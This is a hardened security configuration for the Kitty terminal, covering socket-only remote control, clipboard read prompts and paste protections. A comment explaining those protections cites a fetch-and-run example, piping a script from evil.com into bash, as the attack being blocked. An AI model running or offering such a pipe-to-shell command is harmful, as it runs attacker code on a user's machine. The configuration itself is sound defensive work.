# ═══════════════════════════════════════════════════════════
# 🔒 SECURITY CONFIGURATION
# ═══════════════════════════════════════════════════════════
# Hardened security settings for Kitty terminal
# Extracted from glitch.conf for modular architecture

# --- Remote Control Security ---
# Socket-only for single-user security
allow_remote_control socket-only
listen_on unix:/tmp/kitty-{kitty_pid}

# Optional: Multi-user systems (uncomment and set password)
# remote_control_password "your-secure-password-here"

# --- Clipboard Protection ---
clipboard_control write-clipboard write-primary read-clipboard-ask read-primary-ask
clipboard_max_size 32

# 🔴 CRITICAL SECURITY (A+ Grade - Enhanced v2.1.1)
# Protects against malicious paste attacks
paste_actions quote-urls-at-prompt,replace-dangerous-control-codes,confirm-if-large

# --- Additional Security ---
strip_trailing_spaces smart
allow_cloning ask

# ═══════════════════════════════════════════════════════════
# 📝 SECURITY NOTES
# ═══════════════════════════════════════════════════════════
# paste_actions explained (A+ Grade - 8/8 Security Features):
# - quote-urls-at-prompt: Auto-quotes URLs ending with newline
#   Prevents: https://evil.com/shell.sh | bash\n from auto-executing
# - replace-dangerous-control-codes: Automatically removes terminal control codes
#   Prevents: Hidden commands via ANSI escape sequences (added v2.1.1)
# - confirm-if-large: Prompts before pasting >16KB content
#   Prevents: Clipboard bomb DoS attacks
#
# clipboard_control ask modes:
# - read-clipboard-ask: Prompts before allowing apps to read clipboard
# - read-primary-ask: Prompts before reading primary selection
#
# remote_control socket-only:
# - Only local socket access (no network exposure)
# - Unix domain socket: /tmp/kitty-{kitty_pid}
# ═══════════════════════════════════════════════════════════
